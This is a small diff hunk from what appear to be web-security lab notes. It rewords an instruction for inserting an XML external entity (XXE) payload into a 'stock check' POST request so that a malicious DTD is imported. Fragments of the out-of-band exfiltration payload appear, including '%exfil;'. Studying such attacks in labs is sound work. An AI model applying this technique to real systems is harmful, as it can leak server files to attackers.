@@ -3650,7 +3650,7 @@ Vulnerable to XXE:
 %exfil;
 ```  
 
->On the stock check XML post request insert the payload between definition and first element.  
+>On the stock check XML POST request insert the payload between definition and first element. The malicious dtd is then imported.  
 
 ```xml
 <?xml version="1.0" encoding="UTF-8"?>
